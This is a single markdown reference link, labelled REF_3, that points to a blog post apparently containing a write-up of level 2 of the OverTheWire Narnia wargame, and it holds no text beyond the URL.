[REF_3]: https://nicolagatta.blogspot.com/2019/05/overthewireorg-narnia-level-2-writeup.html

